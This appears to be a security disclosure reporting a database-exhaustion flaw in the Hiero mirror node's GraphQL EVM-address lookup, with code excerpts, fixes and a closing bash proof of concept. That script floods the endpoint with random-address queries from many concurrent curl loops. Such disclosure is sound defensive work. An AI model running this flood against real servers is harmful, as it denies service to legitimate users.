### Title
Unbounded DB Query Amplification via Unique EVM Address Flooding in GraphQL `getByEvmAddressAndType()`

### Summary
The GraphQL module's `EntityRepository.findByEvmAddress()` has no `@Cacheable` annotation, meaning every call with a unique EVM address results in a direct database query. Combined with the complete absence of request-rate limiting in the GraphQL module, an unauthenticated attacker can flood the endpoint with unique random 20-byte EVM addresses, generating one DB query per request, saturating the HikariCP connection pool and degrading service for legitimate users.

### Finding Description
**Exact code path:**

`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, lines 34–41:
```java
public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
    byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
    var buffer = ByteBuffer.wrap(evmAddressBytes);
    if (buffer.getInt() == 0 && buffer.getLong() == 0) {
        return entityRepository.findById(buffer.getLong()).filter(e -> e.getType() == type);
    }
    return entityRepository.findByEvmAddress(evmAddressBytes).filter(e -> e.getType() == type); // line 40
}
```

`graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`, lines 16–17:
```java
@Query(value = "select * from entity where evm_address = ?1 and deleted is not true", nativeQuery = true)
Optional<Entity> findByEvmAddress(byte[] evmAddress);
```

**Root cause:** The GraphQL `EntityRepository.findByEvmAddress()` carries no `@Cacheable` annotation. Every invocation with a unique byte array argument issues a fresh SQL query against the `entity` table. This is in direct contrast to the `web3` module's `EntityRepository.findByEvmAddressAndDeletedIsFalse()`, which is annotated with `@Cacheable(cacheNames = CACHE_NAME_EVM_ADDRESS, ...)`.

**No rate limiting exists in the GraphQL module.** `GraphQlConfiguration` only installs `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)`, which bound the structural complexity of a single query document but impose no per-IP or global request-per-second cap. The only servlet filter present is `LoggingFilter`, which performs no throttling. The `web3` module's `ThrottleConfiguration` (bucket4j, `requestsPerSecond=500`) is entirely absent from the GraphQL module.

**Exploit flow:**
1. Attacker crafts GraphQL queries of the form:
   ```graphql
   query { account(input: { evmAddress: "<random_40_hex_chars>" }) { id } }
   ```
   where the first 4 bytes of the address are non-zero (ensuring `buffer.getInt() != 0`), so the `findByEvmAddress` branch is always taken.
2. Each request uses a freshly generated random 20-byte address — guaranteed cache miss (no cache exists).
3. Each request executes `SELECT * FROM entity WHERE evm_address = $1 AND deleted IS NOT TRUE` against the live DB.
4. At high concurrency, all HikariCP connections are consumed; legitimate queries queue or time out.

**Why existing checks fail:**
- `MaxQueryComplexityInstrumentation(200)`: limits field-selection complexity within one document; a single-field `account` query has complexity ≈ 1, well under the limit.
- `MaxQueryDepthInstrumentation(10)`: limits nesting depth; a flat `account { id }` query has depth 1.
- JSON/GraphQL parser token/character limits: the attack payload is tiny (~80 chars), far below `maxCharacters(10000)`.
- No `@Cacheable` on `findByEvmAddress`: confirmed by reading the interface — zero Spring Cache annotations present.

### Impact Explanation
An attacker with no credentials can cause sustained DB connection pool exhaustion in the GraphQL service. The HikariCP pool is finite (typically 10–20 connections by default); once saturated, all subsequent legitimate GraphQL queries block waiting for a connection, producing timeouts and HTTP 500 errors. The Prometheus alert `GraphQLHighDBConnections` fires at 75% utilization, confirming the operators themselves recognize this as a critical resource boundary. The attack requires no authentication, no special knowledge, and no economic cost.

### Likelihood Explanation
The attack is trivially scriptable: a single `curl` loop or any HTTP load-testing tool (e.g., `wrk`, `hey`) with randomized EVM address variables suffices. The GraphQL endpoint is publicly reachable by design. No account, token, or on-chain asset is required. The attack is repeatable indefinitely and can be sustained from a single machine or amplified with a botnet.

### Recommendation
1. **Add `@Cacheable` to `findByEvmAddress`** in the GraphQL `EntityRepository`, mirroring the `web3` module pattern, with a bounded `maximumSize` and `expireAfterWrite` to prevent unbounded memory growth. Cache negative results (`unless = "#result != null && #result.isEmpty()"` should be reconsidered — cache empty optionals too, or use a sentinel) to prevent repeated DB hits for non-existent addresses.
2. **Implement request-rate limiting** in the GraphQL module equivalent to the `web3` module's `ThrottleConfiguration` (bucket4j token bucket), enforcing a global and/or per-IP requests-per-second cap.
3. **Consider a negative-result cache** specifically for `findByEvmAddress` misses, since the attack exclusively targets non-existent addresses. The current `unless = "#result == null"` pattern in the `web3` module only caches hits; a short-TTL negative cache (e.g., 30 s) would absorb miss floods.

### Proof of Concept
```bash
# Requires: bash, curl, openssl
GRAPHQL_URL="https://<mirror-node-host>/graphql/alpha"

flood() {
  while true; do
    # Generate a random EVM address with non-zero first byte (forces findByEvmAddress path)
    ADDR=$(printf '%02x' $((RANDOM % 255 + 1)))$(openssl rand -hex 19)
    curl -s -o /dev/null -X POST "$GRAPHQL_URL" \
      -H 'Content-Type: application/json' \
      -d "{\"query\":\"{ account(input:{evmAddress:\\\"$ADDR\\\"}){id} }\"}" &
  done
}

# Launch 50 concurrent flooding goroutines
for i in $(seq 1 50); do flood; done
wait
```

Each iteration generates a unique 20-byte hex address. The first byte is forced non-zero so `buffer.getInt() != 0` and the `findByEvmAddress` DB path is always taken. With 50 concurrent loops, HikariCP connections are exhausted within seconds, and legitimate queries begin timing out.
